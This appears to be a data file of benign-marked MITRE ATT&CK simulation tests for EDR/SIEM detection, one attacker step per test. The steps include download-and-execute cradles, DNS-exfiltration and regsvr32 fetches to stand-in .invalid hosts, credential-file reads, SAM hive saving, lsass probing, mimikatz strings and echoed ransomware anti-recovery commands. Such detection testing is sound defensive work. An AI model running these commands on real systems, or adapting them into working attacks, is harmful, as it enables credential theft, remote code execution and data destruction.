description: Benign MITRE ATT&CK simulations for blue-team detection testing. Every test emits telemetry an EDR/SIEM should detect, but performs no malicious action. Inspired by Atomic Red Team.

techniques.name: Command and Scripting Interpreter: Unix Shell
techniques.description: Adversaries may abuse Unix shell commands and scripts for execution.

tests.name: whoami_via_bash
tests.description: Spawn bash and execute `whoami` — basic shell-execution telemetry.
tests.command: whoami

tests.name: id_via_bash
tests.description: Print uid/gid/groups via id(1).
tests.command: id

techniques.name: Command and Scripting Interpreter: PowerShell
techniques.description: Adversaries may abuse PowerShell commands and scripts for execution.

tests.name: whoami_via_powershell
tests.description: Run whoami inside powershell.exe.
tests.command: whoami; Get-Date | Out-String

tests.name: encoded_command
tests.description: Run a base64-encoded benign command (T1027 + T1059.001).
tests.command: $b='V3JpdGUtSG9zdCAiQ1NQLXRlc3QiOyBHZXQtUHJvY2Vzcw==';powershell -EncodedCommand $b

techniques.name: Command and Scripting Interpreter: Windows Command Shell
techniques.description: Adversaries may abuse cmd.exe for execution.

tests.name: whoami_via_cmd
tests.description: cmd /c whoami — most common LOLBin probe.
tests.command: whoami && hostname

techniques.name: System Information Discovery
techniques.description: Adversaries enumerate OS, hardware, and version data after access.

tests.name: uname_unix
tests.description: Kernel and arch via uname; tries /etc/os-release when present.
tests.command: uname -a && (cat /etc/os-release 2>/dev/null | head -n 5 || sw_vers 2>/dev/null)

tests.name: systeminfo_windows
tests.description: Equivalent on Windows: systeminfo.
tests.command: systeminfo

techniques.name: Account Discovery: Local Account
techniques.description: Adversaries enumerate local user accounts.

tests.name: passwd_read
tests.description: cat /etc/passwd to enumerate local users.
tests.command: cat /etc/passwd

tests.name: net_user_windows
tests.description: net user — list local users on Windows.
tests.command: net user && net localgroup administrators

techniques.name: Process Discovery
techniques.description: Adversaries list running processes after access.

tests.name: ps_aux
tests.description: ps aux — list all processes on Linux/Mac.
tests.command: ps aux | head -n 30

tests.name: tasklist_windows
tests.description: tasklist — Windows equivalent.
tests.command: tasklist /v

techniques.name: File and Directory Discovery
techniques.description: Adversaries enumerate filesystem after access.

tests.name: find_recent_files
tests.description: Find files modified in last 24h under $HOME.
tests.command: find "${HOME:-/tmp}" -type f -mtime -1 2>/dev/null | head -n 50

techniques.name: Remote System Discovery
techniques.description: Adversaries enumerate other hosts on the network.

tests.name: arp_table
tests.description: Read ARP cache.
tests.command: ip neigh show 2>/dev/null || arp -a 2>/dev/null || cat /proc/net/arp

techniques.name: System Network Configuration Discovery
techniques.description: Adversaries probe local network configuration.

tests.name: ip_addr
tests.description: Show interfaces and addresses.
tests.command: ip addr 2>/dev/null || ifconfig

tests.name: ipconfig_windows
tests.description: Windows ipconfig /all.
tests.command: ipconfig /all

techniques.name: System Network Connections Discovery
techniques.description: Adversaries inspect open sockets after access.

tests.name: ss_listen
tests.description: List listening TCP/UDP sockets.
tests.command: ss -tulpn 2>/dev/null || netstat -tulpn

tests.name: netstat_windows
tests.description: netstat -ano on Windows.
tests.command: netstat -ano

techniques.name: System Owner / User Discovery
techniques.description: Identifies the current logged-in user.

tests.name: whoami_all
tests.description: whoami; logname; w (combined).
tests.command: whoami; logname 2>/dev/null; w 2>/dev/null | head -n 5

techniques.name: Software Discovery: Security Software
techniques.description: Enumerate installed AV / EDR.

tests.name: list_av_processes_linux
tests.description: Look for common Linux EDR processes (falcon-sensor, osquery, auditd).
tests.command: ps -ef | grep -Ei 'falcon|osquery|auditd|sentinel|crowdstrike|carbonblack|wazuh' | grep -v grep || echo 'no edr processes seen'

tests.name: list_av_services_windows
tests.description: PowerShell — Get-Service for Defender/CrowdStrike/etc.
tests.command: Get-Service | Where-Object {$_.Name -match 'WinDefend|CSFalcon|Sense|Sentinel'} | Format-Table -AutoSize

techniques.name: Deobfuscate / Decode Files or Information
techniques.description: Adversaries decode obfuscated data at runtime.

tests.name: base64_decode_benign
tests.description: Echo+decode a benign base64 string ('CSP-test').
tests.command: echo 'Q1NQLXRlc3Q=' | base64 -d && echo

techniques.name: Obfuscated Files or Information
techniques.description: Adversaries pack/encode payloads to evade static detection.

tests.name: encode_script_base64
tests.description: Base64-encode a benign 'whoami' inline.
tests.command: echo 'whoami' | base64

techniques.name: Boot or Logon Autostart Execution: Registry Run Keys
techniques.description: Adversaries write a value under HKCU\...\Run for persistence.

tests.name: write_run_key_test
tests.description: Add and remove a clearly-marked CSP test value under HKCU Run.
tests.command: $k='HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'; New-ItemProperty -Path $k -Name 'CSP_TEST_DELETE_ME' -Value 'notepad.exe' -Force; Start-Sleep 1; Remove-ItemProperty -Path $k -Name 'CSP_TEST_DELETE_ME' -Force
expected_signals: registry value created at HKCU Run

techniques.name: Scheduled Task / Job: Scheduled Task
techniques.description: Adversaries use schtasks for persistence.

tests.name: schtasks_list
tests.description: List scheduled tasks (read-only — no creation).
tests.command: schtasks /query /fo LIST /v | more

techniques.name: System Binary Proxy Execution: Rundll32
techniques.description: Rundll32 abuse for proxy execution.

tests.name: rundll32_help
tests.description: Invoke a benign rundll32 -> shell32 ShellAbout dialog (closes itself in the script).
tests.command: Start-Process rundll32.exe -ArgumentList 'shell32.dll,Control_RunDLL' -PassThru | ForEach-Object { Start-Sleep 1; Stop-Process -Id $_.Id -ErrorAction SilentlyContinue }

techniques.name: OS Credential Dumping (SIMULATION)
techniques.description: Adversaries dump credentials from memory (mimikatz, lsass). This test only emits the keyword & file path indicators an EDR should match — it does NOT extract any credential.

tests.name: mimikatz_keyword_simulation
tests.description: Echo 'mimikatz' and 'sekurlsa::logonpasswords' to trigger keyword/string detection rules.
tests.command: echo 'mimikatz sekurlsa::logonpasswords privilege::debug' && echo 'simulation only — no credential extraction'

tests.name: lsass_handle_simulation
tests.description: PowerShell Get-Process lsass — common precursor to dumping. No memory read performed.
tests.command: Get-Process lsass -ErrorAction SilentlyContinue | Format-Table Id,Name,Path -AutoSize

techniques.name: Unsecured Credentials: Files
techniques.description: Adversaries grep filesystem for credential keywords.

tests.name: grep_passwords_in_home
tests.description: Recursive grep for 'password' under $HOME (read-only, results truncated).
tests.command: grep -RIli 'password' "${HOME:-/tmp}" 2>/dev/null | head -n 20

techniques.name: Ingress Tool Transfer
techniques.description: Adversaries download tooling onto a host.

tests.name: curl_eicar_download
tests.description: Download the official EICAR test file from secure.eicar.org via curl.
tests.command: curl -fsS -o /tmp/csp-eicar.txt https://secure.eicar.org/eicar.com.txt && ls -la /tmp/csp-eicar.txt && head -c 70 /tmp/csp-eicar.txt; rm -f /tmp/csp-eicar.txt

tests.name: iwr_eicar_download
tests.description: Windows: Invoke-WebRequest the official EICAR test file.
tests.command: Invoke-WebRequest -Uri 'https://secure.eicar.org/eicar.com.txt' -OutFile $env:TEMP\csp-eicar.txt; Get-Item $env:TEMP\csp-eicar.txt; Remove-Item $env:TEMP\csp-eicar.txt -Force

techniques.name: Application Layer Protocol: Web (HTTP)
techniques.description: Probe outbound HTTP — used here only to demonstrate beacon-like traffic to a public health endpoint.

tests.name: http_beacon_probe
tests.description: Single GET to https://www.example.com and print status.
tests.command: curl -s -o /dev/null -w 'http_code=%{http_code} size=%{size_download} time=%{time_total}\n' https://www.example.com
expected_signals: egress HTTPS connection from non-browser process

techniques.name: Remote Services: SSH
techniques.description: Adversaries use SSH to move laterally between *nix hosts. This test only spawns ssh(1) against a deliberately invalid host with BatchMode and a short timeout — process telemetry is emitted but no authentication or remote interaction occurs.

tests.name: ssh_attempt_invalid_host
tests.description: Spawn ssh against csp-lateral-test.invalid with BatchMode=yes — fails fast on DNS, but EDR observes ssh process_create and outbound TCP/22 attempt.
tests.command: ssh -o BatchMode=yes -o ConnectTimeout=2 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null csp-lateral-test.invalid 'whoami' 2>&1 | head -n 5 || true; echo '[CSP] ssh process telemetry emitted (no auth attempted)'
expected_signals: ssh client argv with BatchMode=yes (typical of automation / lateral tooling)
outbound TCP/22 attempt from non-interactive process

techniques.name: Remote Services: SMB / Windows Admin Shares
techniques.description: Adversaries reach Admin$ / IPC$ / C$ over SMB to move laterally. This test only enumerates local shares — no remote authentication is attempted.

tests.name: enumerate_local_smb_shares
tests.description: Get-SmbShare locally + net view \\localhost — typical pre-lateral-movement reconnaissance pattern.
tests.command: Get-SmbShare | Format-Table Name,Path,Description -AutoSize; net view \\localhost

tests.name: smb_admin_share_probe
tests.description: Test-Path to \\localhost\C$ — probes IPC + Admin$ access pattern. Fails benignly if not authorized.
tests.command: try { Test-Path '\\localhost\C$' } catch { Write-Host '[CSP] admin$ probe failed (expected unless local admin)' }

techniques.name: Remote Services: Windows Remote Management (WinRM)
techniques.description: Adversaries use WinRM (PowerShell remoting) to execute on remote hosts. This test only probes WSMan on localhost — no remote command is run.

tests.name: test_wsman_localhost
tests.description: Test-WSMan against localhost — emits WinRM HTTP/HTTPS probe telemetry without launching a remote session.
tests.command: try { Test-WSMan -ComputerName localhost -ErrorAction Stop | Format-List } catch { Write-Host '[CSP] WinRM probe failed (service may be disabled - expected)' }

techniques.name: Lateral Tool Transfer
techniques.description: Adversaries copy tooling between hosts inside the network. These tests spawn the typical transfer process (scp / Copy-Item) but the target is invalid so no transfer succeeds.

tests.name: scp_attempt_invalid_host
tests.description: Spawn scp to push /etc/hostname to an invalid lateral target — emits scp process telemetry without a real transfer.
tests.command: scp -o BatchMode=yes -o ConnectTimeout=2 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null /etc/hosts csp-lateral-test.invalid:/tmp/csp-payload.txt 2>&1 | head -n 5 || true; echo '[CSP] scp telemetry emitted (no transfer occurred)'
expected_signals: scp argv targeting remote host (lateral transfer indicator)

tests.name: copy_item_to_session_simulation
tests.description: PowerShell Copy-Item -ToSession to a non-existent PSSession — emits the lateral-transfer cmdlet pattern without an actual session.
tests.command: try { $s = New-PSSession -ComputerName 'csp-lateral-test.invalid' -ErrorAction Stop; Copy-Item -Path $env:windir\System32\drivers\etc\hosts -Destination 'C:\Temp\' -ToSession $s; Remove-PSSession $s } catch { Write-Host '[CSP] PSSession to invalid host failed (expected) — pattern logged in PowerShell ScriptBlock' }
expected_signals: New-PSSession + Copy-Item -ToSession pattern in Script Block Logging
WinRM connection attempt to invalid host

techniques.name: Use Alternate Authentication Material: Pass-the-Hash (SIMULATION)
techniques.description: Adversaries authenticate to remote services with a captured NTLM hash instead of a password. This test only echoes the canonical mimikatz pass-the-hash command line as a string-detection probe — no hash is provided, used, or transmitted.

tests.name: pth_keyword_simulation
tests.description: Echo the typical 'sekurlsa::pth' invocation pattern — verifies SIEM/YARA string-match rules without performing PtH.
tests.command: echo 'sekurlsa::pth /user:Administrator /domain:CSP-LAB /ntlm:00000000000000000000000000000000 /run:cmd.exe' && echo '[CSP] simulation only — no hash supplied, no auth attempted'
expected_signals: string match: '/ntlm:' followed by hash-shaped value

tests.name: pth_keyword_simulation_powershell
tests.description: PowerShell variant — echo PtH invocation pattern via Write-Host for ScriptBlock logging detection.
tests.command: Write-Host 'sekurlsa::pth /user:Administrator /domain:CSP-LAB /ntlm:00000000000000000000000000000000 /run:cmd.exe'; Write-Host '[CSP] simulation only — no hash supplied'
expected_signals: Defender AMSI may flag mimikatz keywords

techniques.name: Indicator Removal: File Deletion
techniques.description: Adversaries delete files to hide tracks.

tests.name: create_and_delete_file
tests.description: Create a marker file in /tmp then delete it (simulates evidence removal).
tests.command: f=/tmp/csp_test_evidence_$$.log; date > "$f"; ls -la "$f"; rm -f "$f"; echo deleted
expected_signals: file create -> file delete short window

techniques.name: Process Injection (BTP Simulation)
techniques.description: Adversaries inject code into processes. This test spawns process chains that mimic injection patterns (parent-child anomalies) without performing actual injection. Triggers Cortex XDR BTP rules for suspicious process relationships.

tests.name: notepad_spawns_cmd
tests.description: Notepad.exe spawns cmd.exe — anomalous parent-child chain that BTP should flag.
tests.command: $n = Start-Process notepad.exe -PassThru; Start-Sleep 1; Start-Process cmd.exe -ArgumentList '/c whoami && echo CSP-BTP-test' -Wait; Stop-Process -Id $n.Id -Force -ErrorAction SilentlyContinue; Write-Host '[CSP] BTP test: notepad -> cmd chain emitted'

tests.name: excel_spawns_powershell_simulation
tests.description: Simulate Office app spawning PowerShell — rename a benign exe or use wscript to mimic the chain. BTP detects Office-to-script-engine chains.
tests.command: Start-Process wscript.exe -ArgumentList '//nologo //e:jscript "<CSP-BTP-test>"' -ErrorAction SilentlyContinue; Start-Sleep 1; powershell.exe -NoProfile -Command 'Write-Host CSP-BTP-chain-test; whoami'; Write-Host '[CSP] Office-like -> PS chain emitted'

tests.name: svchost_child_anomaly
tests.description: Launch cmd from a context that mimics svchost child — BTP monitors svchost children closely.
tests.command: Start-Process cmd.exe -ArgumentList '/c echo CSP-BTP-svchost-child-test && whoami && ipconfig' -Wait; Write-Host '[CSP] suspicious child-of-service pattern emitted'
expected_signals: BTP: unexpected child of service process

techniques.name: System Binary Proxy Execution: Regsvr32
techniques.description: Regsvr32 abuse for proxy execution (squiblydoo). BTP detects regsvr32 with network or script arguments.

tests.name: regsvr32_scrobj_pattern
tests.description: Invoke regsvr32 with /i:URL pattern (squiblydoo) pointing to invalid host — triggers BTP without executing payload.
tests.command: try { Start-Process regsvr32.exe -ArgumentList '/s /n /u /i:http://csp-btp-test.invalid/test.sct scrobj.dll' -Wait -ErrorAction Stop } catch {} ; Write-Host '[CSP] regsvr32 squiblydoo pattern emitted — BTP should alert'

techniques.name: BITS Jobs
techniques.description: Adversaries use BITS (Background Intelligent Transfer Service) to download/upload or persist. BTP detects bitsadmin with suspicious arguments.

tests.name: bitsadmin_download_eicar
tests.description: Use bitsadmin to download EICAR test file — triggers BTP LOLBin download rule.
tests.command: bitsadmin /transfer CSP-BTP-Test /download /priority normal https://secure.eicar.org/eicar.com.txt %TEMP%\csp-bits-eicar.txt & type %TEMP%\csp-bits-eicar.txt & del %TEMP%\csp-bits-eicar.txt

tests.name: bitsadmin_create_job
tests.description: Create and cancel a BITS job — emits job creation telemetry without completing transfer.
tests.command: bitsadmin /create CSP-BTP-TestJob & bitsadmin /addfile CSP-BTP-TestJob http://csp-btp-test.invalid/payload.bin %TEMP%\csp-bits-payload.bin & bitsadmin /cancel CSP-BTP-TestJob & echo [CSP] BITS job pattern emitted

techniques.name: Ingress Tool Transfer: Certutil Download
techniques.description: Certutil.exe abused as download LOLBin. Cortex XDR BTP specifically detects certutil -urlcache patterns.

tests.name: certutil_urlcache_eicar
tests.description: certutil -urlcache -split -f to download EICAR — classic LOLBin download that BTP should catch.
tests.command: certutil -urlcache -split -f https://secure.eicar.org/eicar.com.txt %TEMP%\csp-certutil-eicar.txt & type %TEMP%\csp-certutil-eicar.txt & del %TEMP%\csp-certutil-eicar.txt & certutil -urlcache * delete

tests.name: certutil_encode_decode
tests.description: certutil -encode / -decode a benign file — tests BTP detection of certutil obfuscation.
tests.command: echo CSP-BTP-TEST > %TEMP%\csp-plain.txt & certutil -encode %TEMP%\csp-plain.txt %TEMP%\csp-encoded.b64 & certutil -decode %TEMP%\csp-encoded.b64 %TEMP%\csp-decoded.txt & type %TEMP%\csp-decoded.txt & del %TEMP%\csp-plain.txt %TEMP%\csp-encoded.b64 %TEMP%\csp-decoded.txt

techniques.name: PowerShell Download Cradle (BTP)
techniques.description: PowerShell download cradle patterns that Cortex XDR BTP specifically detects: IEX(IWR ...), Net.WebClient, etc.

tests.name: iex_iwr_cradle
tests.description: IEX(Invoke-WebRequest ...) download cradle pointing to EICAR — classic BTP trigger.
tests.command: try { IEX (Invoke-WebRequest -Uri 'https://secure.eicar.org/eicar.com.txt' -UseBasicParsing).Content } catch { Write-Host "[CSP] IEX(IWR) cradle executed — AV/BTP should have blocked: $_" }

tests.name: webclient_downloadstring
tests.description: Net.WebClient DownloadString cradle — another common BTP-detected pattern.
tests.command: try { $w = New-Object Net.WebClient; $r = $w.DownloadString('https://secure.eicar.org/eicar.com.txt'); Write-Host $r } catch { Write-Host "[CSP] WebClient cradle fired — BTP/AMSI should detect: $_" }

tests.name: powershell_hidden_window
tests.description: PowerShell -WindowStyle Hidden — BTP detects hidden PowerShell spawns.
tests.command: powershell.exe -WindowStyle Hidden -NoProfile -Command "Write-Host 'CSP-BTP-hidden-window-test'; Start-Sleep 1" & echo [CSP] hidden PowerShell window pattern emitted

techniques.name: OS Credential Dumping: LSASS Memory (BTP Simulation)
techniques.description: Adversaries access LSASS process memory to extract credentials. This test only performs read-only process enumeration that mimics the LSASS access pattern — NO memory is read, NO credentials extracted. BTP detects the access attempt.

tests.name: lsass_access_pattern
tests.description: Open handle to lsass with read-only rights then immediately close — triggers BTP LSASS protection without dumping.
tests.command: $p = Get-Process lsass -ErrorAction SilentlyContinue; if ($p) { Write-Host "[CSP] lsass PID=$($p.Id) found — BTP should detect access pattern"; Write-Host "[CSP] NOT reading memory — simulation only" } else { Write-Host '[CSP] lsass not found (may need elevation)' }

tests.name: procdump_lsass_simulation
tests.description: Echo the procdump command line that would dump lsass — BTP detects the command pattern even if procdump isn't present.
tests.command: echo procdump.exe -ma lsass.exe C:\Temp\lsass.dmp & echo [CSP] procdump lsass pattern emitted (NOT executed) — BTP command-line detection

tests.name: comsvcs_minidump_simulation
tests.description: Echo the comsvcs.dll MiniDump pattern — known LOLBin for LSASS dump that BTP detects.
tests.command: echo rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).Id C:\Temp\lsass.dmp full & echo [CSP] comsvcs MiniDump pattern emitted (NOT executed)

techniques.name: OS Credential Dumping: SAM Registry (BTP Simulation)
techniques.description: Adversaries extract SAM/SYSTEM/SECURITY hives via reg save. BTP detects reg.exe saving credential hives.

tests.name: reg_save_sam_simulation
tests.description: Attempt reg save of SAM hive — should be denied without admin, but BTP logs the attempt.
tests.command: reg save HKLM\SAM %TEMP%\csp-sam-test.hiv 2>&1 & del %TEMP%\csp-sam-test.hiv 2>nul & echo [CSP] reg save SAM pattern emitted — BTP should alert

tests.name: shadow_copy_ntds_simulation
tests.description: Echo vssadmin + ntds.dit extraction pattern — domain controller credential theft simulation.
tests.command: echo vssadmin create shadow /for=C: & echo copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\Temp\ntds.dit & echo [CSP] shadow copy + ntds.dit pattern emitted (NOT executed)

techniques.name: Data Encrypted for Impact (Ransomware BTP Simulation)
techniques.description: Simulates Cortex XDR-detectable ransomware behavior: high-entropy writes into a user data folder, mass rename to suspicious extensions, ransom-note drop, and anti-recovery LOLBin patterns (vssadmin / bcdedit / wbadmin / wmic in READ-ONLY mode). NO real encryption of user files, NO real shadow-copy deletion, NO real recovery disable — every destructive command is replaced with its read-only sibling (e.g. vssadmin list shadows instead of vssadmin delete shadows). All test data written to a dedicated csp-ransom-test/ subfolder which is removed at end of test.

tests.name: high_entropy_mass_encrypt_documents_windows
tests.description: Write 100 high-entropy random-byte files into %USERPROFILE%\Documents\csp-ransom-test\, then rename each to a suspicious extension. Cortex XDR BTP 'Cryptographic Ransomware' rule keys on (a) user-data-folder writes, (b) high-entropy output, (c) mass rename — this test hits all three. SAFETY: only the dedicated subfolder is touched; no user file is read or modified.
tests.command: $d = Join-Path $env:USERPROFILE 'Documents\csp-ransom-test'; New-Item -ItemType Directory -Path $d -Force | Out-Null; $rng = [System.Security.Cryptography.RandomNumberGenerator]::Create(); $buf = New-Object byte[] 4096; 1..100 | ForEach-Object { $rng.GetBytes($buf); [IO.File]::WriteAllBytes((Join-Path $d "doc_$_.txt"), $buf) }; Write-Host "[CSP] wrote 100 x 4KB high-entropy files to $d"; Get-ChildItem "$d\*.txt" | Rename-Item -NewName { $_.Name -replace '\.txt$','.csplocker' }; Write-Host "[CSP] renamed all to .csplocker"; Set-Content (Join-Path $d 'README_DECRYPT.txt') 'CSP SIMULATION - this is a Cortex XDR detection test. No real encryption.'; Write-Host '[CSP] ransom note dropped'; Start-Sleep 2; Remove-Item $d -Recurse -Force; Write-Host '[CSP] cleanup done - BTP should have alerted on mass encrypt+rename+note in user Documents'
expected_signals: BTP: Cryptographic Ransomware rule (high-entropy writes in user data folder)
mass file rename to non-standard extension (.csplocker)

tests.name: vssadmin_shadow_recon_simulation
tests.description: Trigger BTP 'Volume Shadow Copy abuse' detection using vssadmin LIST (read-only). Real ransomware runs 'vssadmin delete shadows /all /quiet' — Cortex XDR alerts on the process+argv pattern, and 'list shadows' fires the same image+publisher chain without destroying recovery points. SAFETY: read-only command; no shadow copies are deleted.
tests.command: echo [CSP] Simulating ransomware Volume Shadow Copy abuse - READ-ONLY (list, not delete) & vssadmin list shadows 2>&1 | findstr /C:"shadow" /C:"No items" & echo [CSP] equivalent destructive command (NOT run): vssadmin delete shadows /all /quiet & echo [CSP] BTP should alert on vssadmin.exe spawn from cmd.exe with shadow-related argv
expected_signals: BTP: vssadmin.exe child of cmd.exe (anti-recovery LOLBin chain)
audit log of equivalent destructive command pattern

tests.name: bcdedit_recovery_recon_simulation
tests.description: Trigger BTP 'bcdedit recovery tampering' detection using bcdedit /enum (read-only). Real ransomware runs 'bcdedit /set recoveryenabled no' and 'bcdedit /set bootstatuspolicy ignoreallfailures' — Cortex XDR alerts on any bcdedit child of a non-installer process. SAFETY: /enum only inspects the boot store; nothing is modified.
tests.command: echo [CSP] Simulating ransomware boot-recovery tamper - READ-ONLY (enum, not set) & bcdedit /enum {current} 2>&1 | findstr /I /C:"recoveryenabled" /C:"bootstatuspolicy" /C:"identifier" & echo [CSP] equivalent destructive commands (NOT run): bcdedit /set {default} recoveryenabled no ^&^& bcdedit /set {default} bootstatuspolicy ignoreallfailures & echo [CSP] BTP should alert on bcdedit.exe spawn from cmd.exe
expected_signals: BTP: bcdedit.exe child of cmd.exe (boot-recovery tamper LOLBin)
audit log of equivalent destructive command pattern

tests.name: wbadmin_backup_recon_simulation
tests.description: Trigger BTP 'wbadmin backup-catalog tamper' detection using wbadmin GET (read-only). Real ransomware runs 'wbadmin delete catalog -quiet' to wreck backups. SAFETY: get versions only — no backup is touched.
tests.command: echo [CSP] Simulating ransomware backup-catalog tamper - READ-ONLY & wbadmin get versions 2>&1 | findstr /I /C:"backup" /C:"version" /C:"target" /C:"no backups" & echo [CSP] equivalent destructive command (NOT run): wbadmin delete catalog -quiet & echo [CSP] BTP should alert on wbadmin.exe spawn from cmd.exe
expected_signals: BTP: wbadmin.exe child of cmd.exe (backup-catalog LOLBin)

tests.name: wmic_shadow_recon_simulation
tests.description: Trigger BTP 'wmic shadowcopy access' detection. Real ransomware uses 'wmic shadowcopy delete' to wreck shadow copies via WMI. SAFETY: 'wmic shadowcopy get' is read-only.
tests.command: echo [CSP] Simulating ransomware WMI shadowcopy abuse - READ-ONLY & wmic shadowcopy get ID,VolumeName 2>&1 | findstr /I /C:"ID" /C:"No Instance" /C:"shadow" & echo [CSP] equivalent destructive command (NOT run): wmic shadowcopy delete & echo [CSP] BTP should alert on wmic.exe shadowcopy child of cmd.exe
expected_signals: BTP: wmic.exe child of cmd.exe with shadowcopy argv

tests.name: high_entropy_mass_encrypt_documents_linux
tests.description: Linux equivalent: 100 x 4KB random-byte files under $HOME/csp-ransom-test/, then mass rename to .csplocker. Targets EDR/auditd ransomware heuristics that watch $HOME for high-entropy bulk writes followed by mass rename.
tests.command: d="${HOME:-/tmp}/csp-ransom-test" && mkdir -p "$d" && for i in $(seq 1 100); do head -c 4096 /dev/urandom > "$d/doc_$i.txt"; done && echo "[CSP] wrote 100 x 4KB high-entropy files to $d" && for f in "$d"/*.txt; do mv "$f" "${f%.txt}.csplocker"; done && echo "[CSP] $(ls $d | wc -l) files renamed to .csplocker" && echo 'CSP SIMULATION - ransomware detection test, no real encryption.' > "$d/README_DECRYPT.txt" && echo '[CSP] ransom note dropped' && sleep 1 && rm -rf "$d" && echo '[CSP] cleanup done'

tests.name: ransom_note_drop_user_profile
tests.description: Drop two classic ransom-note filenames into %USERPROFILE%\Documents and the current desktop. Cortex XDR flags well-known filename patterns (README_DECRYPT*, HOW_TO_DECRYPT*, DECRYPT_INSTRUCTIONS*) anywhere under user data folders. SAFETY: files removed after 3 s.
tests.command: $d = Join-Path $env:USERPROFILE 'Documents\csp-ransom-test'; New-Item -ItemType Directory -Path $d -Force | Out-Null; @('README_DECRYPT.txt','HOW_TO_DECRYPT.html','DECRYPT_INSTRUCTIONS.txt','!!!_READ_ME_!!!.txt') | ForEach-Object { Set-Content (Join-Path $d $_) 'CSP SIMULATION - ransomware detection test only. No files were encrypted.' }; Write-Host "[CSP] dropped 4 ransom-note filenames into $d"; Start-Sleep 3; Remove-Item $d -Recurse -Force; Write-Host '[CSP] cleanup done'
expected_signals: BTP: ransom note filename pattern (README_DECRYPT, HOW_TO_DECRYPT, DECRYPT_INSTRUCTIONS, !!!_READ_ME_!!!)
process_write: powershell.exe creating ransom-note-shaped files under %USERPROFILE%\Documents

techniques.name: Masquerading: Rename System Utilities
techniques.description: Adversaries rename system binaries to evade detection. BTP detects binary image hash mismatch with filename.

tests.name: renamed_cmd_execution
tests.description: Copy cmd.exe to a temp name and execute — BTP detects image mismatch.
tests.command: Copy-Item $env:windir\System32\cmd.exe $env:TEMP\svchost-csp.exe -Force; Start-Process $env:TEMP\svchost-csp.exe -ArgumentList '/c echo CSP-masquerade-test && whoami' -Wait; Remove-Item $env:TEMP\svchost-csp.exe -Force; Write-Host '[CSP] renamed cmd.exe executed — BTP should detect image/name mismatch'
expected_signals: BTP: binary masquerading (cmd.exe renamed to svchost-csp.exe)
image hash mismatch with process name

tests.name: renamed_powershell_execution
tests.description: Copy powershell.exe to temp name — triggers BTP renamed binary detection.
tests.command: Copy-Item $env:windir\System32\WindowsPowerShell\v1.0\powershell.exe $env:TEMP\update-csp.exe -Force; Start-Process $env:TEMP\update-csp.exe -ArgumentList '-NoProfile -Command "Write-Host CSP-masquerade-powershell"' -Wait; Remove-Item $env:TEMP\update-csp.exe -Force; Write-Host '[CSP] renamed powershell.exe executed — BTP should alert'

techniques.name: System Services: Service Execution
techniques.description: Adversaries create/start Windows services for execution. BTP detects sc.exe service creation with suspicious binaries.

tests.name: sc_create_delete_test
tests.description: Create a service pointing to a benign binary, then immediately delete — BTP detects the creation pattern.
tests.command: sc create CSP-BTP-TestSvc binPath= "cmd.exe /c echo CSP-test" start= demand 2>&1 & sc delete CSP-BTP-TestSvc 2>&1 & echo [CSP] service create+delete pattern emitted
expected_signals: BTP: sc.exe create with cmd.exe binPath

techniques.name: Scheduled Task Creation (BTP)
techniques.description: Adversaries use schtasks /create for persistence. BTP detects task creation with suspicious commands.

tests.name: schtasks_create_delete
tests.description: Create a scheduled task with cmd payload then immediately delete — emits BTP telemetry.
tests.command: schtasks /create /tn "CSP-BTP-Test" /tr "cmd.exe /c echo CSP-persistence-test" /sc once /st 23:59 /f 2>&1 & schtasks /delete /tn "CSP-BTP-Test" /f 2>&1 & echo [CSP] scheduled task create+delete pattern emitted

techniques.name: AMSI Bypass Attempt (BTP Detection)
techniques.description: Test Cortex XDR BTP + AMSI integration by attempting known AMSI bypass patterns. BTP should detect and block these.

tests.name: amsi_bypass_string_detection
tests.description: Echo AMSI bypass keywords — BTP/AMSI should flag the pattern without any bypass succeeding.
tests.command: Write-Host 'Testing AMSI detection: amsiInitFailed AmsiScanBuffer AmsiUtils'; Write-Host '[CSP] AMSI bypass keywords emitted — BTP/AMSI should log detection'

tests.name: reflection_amsi_pattern
tests.description: Use reflection-style syntax that BTP monitors — no actual bypass, just the pattern.
tests.command: try { [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils') } catch { Write-Host "[CSP] Reflection AMSI pattern attempted — BTP should detect: $_" }; Write-Host '[CSP] AMSI reflection pattern emitted'

techniques.name: Registry Persistence via Unusual Methods (BTP)
techniques.description: BTP monitors registry writes to Run/RunOnce keys from unusual parent processes. Tests persistence via registry from cmd/PowerShell chains.

tests.name: reg_add_run_key_cmd
tests.description: reg add to HKCU Run via cmd.exe — BTP detects command-line registry persistence.
tests.command: reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v CSP-BTP-Test /t REG_SZ /d "notepad.exe" /f 2>&1 & reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v CSP-BTP-Test /f 2>&1 & echo [CSP] registry Run key write+delete emitted
expected_signals: BTP: reg.exe writing to Run key

techniques.name: Exfiltration Over Alternative Protocol: DNS (BTP Simulation)
techniques.description: Simulate DNS exfiltration by resolving long subdomain queries — BTP and XSIAM analytics detect unusual DNS patterns.

tests.name: dns_exfil_simulation_windows
tests.description: Resolve suspicious long-subdomain DNS queries — XSIAM/BTP detect DNS tunneling pattern.
tests.command: 1..5 | ForEach-Object { $sub = -join ((65..90)+(97..122) | Get-Random -Count 40 | ForEach-Object {[char]$_}); Resolve-DnsName "$sub.exfil-test.csp-btp.invalid" -ErrorAction SilentlyContinue }; Write-Host '[CSP] DNS exfil pattern (5 long random subdomain queries) emitted'

tests.name: dns_exfil_simulation_linux
tests.description: Resolve suspicious long-subdomain DNS queries on Linux — EDR/XSIAM analytics detect pattern.
tests.command: for i in $(seq 1 5); do sub=$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 40); dig +short "$sub.exfil-test.csp-btp.invalid" 2>/dev/null || nslookup "$sub.exfil-test.csp-btp.invalid" 2>/dev/null; done; echo '[CSP] DNS exfil pattern (5 long random subdomain queries) emitted'

techniques.name: Application Layer Protocol: DNS C2 Beacon Pattern
techniques.description: Simulate periodic DNS beacon pattern — XSIAM analytics detect regular-interval DNS queries to the same domain (C2 beaconing).

tests.name: dns_beacon_periodic_windows
tests.description: Resolve the same domain 10 times at 1s intervals — mimics DNS C2 beacon jitter.
